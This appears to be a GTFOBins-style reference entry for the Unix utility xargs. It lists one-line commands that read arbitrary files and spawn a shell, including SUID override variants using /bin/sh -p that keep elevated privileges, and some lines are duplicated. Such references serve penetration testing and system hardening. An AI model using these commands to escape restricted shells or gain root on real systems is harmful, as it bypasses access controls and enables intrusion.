title: xargs
html:
xargs

File Read

xargs -a /path/to/input-file -0

Shell

xargs -a /dev/null /bin/sh

SUID override:

xargs -a /dev/null /bin/sh -p
xargs -a /dev/null /bin/sh

SUID override:

xargs -a /dev/null /bin/sh -p
echo x | xargs -o -a /dev/null /bin/sh

SUID override:

echo x | xargs -o -a /dev/null /bin/sh -p
